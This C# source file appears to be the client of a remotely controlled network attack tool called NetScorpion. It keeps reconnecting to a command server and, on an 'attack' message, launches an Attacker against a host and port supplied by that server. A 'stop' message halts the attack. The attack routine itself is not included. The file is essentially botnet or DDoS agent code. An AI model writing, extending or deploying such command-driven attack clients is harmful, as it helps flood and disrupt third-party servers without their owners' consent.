using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WatsonTcp;
using NetScorpion.Common;

namespace NetScorpion_Client
{
    public class Network
    {
        static string ServerIP = "127.0.0.1";
        static int ServerPORT = 2865;

        public static int ReconnectSecond = 5;

        public static WatsonTcpClient client = new WatsonTcpClient(ServerIP, ServerPORT);

        public static void setEvents()
        {
            client.Events.ServerConnected += connectedToServer;
            client.Events.ServerDisconnected += disconnectedFromServer;
            client.Events.MessageReceived += messageReceived;
        }

        #region Client Events
        
        public static void connectedToServer(object sender, ConnectionEventArgs args)
        {
            Tools.writeLog($"Connection successful. Server: {args.IpPort}", LogType.Success);
        }

        public static void disconnectedFromServer(object sender, DisconnectionEventArgs args)
        {
            Tools.writeLog($"Disconnected from server: {args.IpPort}", LogType.Error);

            trytoconnect:
            try
            {
                Tools.writeLog("Connecting...", LogType.Info);
                Network.client.Connect();
            }
            catch
            {
                Tools.writeLog($"Server did not respond. Trying to re-connect in {Network.ReconnectSecond} seconds...", LogType.Error);

                Thread.Sleep(Network.ReconnectSecond * 1000); //sleep Network.ReconnectSecond seconds

                goto trytoconnect;
            }
        }

        public static Attacker attacker;

        public static void messageReceived(object sender, MessageReceivedEventArgs args)
        {
            Tools.writeLog($"Message Received: {Encoding.UTF8.GetString(args.Data)}", LogType.Info);

            string[] parts = Encoding.UTF8.GetString(args.Data).Split(':');

            if (parts[0] == "attack")
            {
                attacker = new Attacker(args.Metadata.Keys.First().ToString(), Convert.ToInt32(args.Metadata.Values.First().ToString()), parts[1]);
                attacker.Start();
            }
            if (parts[0] == "stop")
            {
                if (attacker.isRunning())
                {
                    attacker.Stop();
                }
                else
                {
                    Tools.writeLog("Attacker isn't running.", LogType.Info);
                }
            }
        }

        #endregion
    }
}
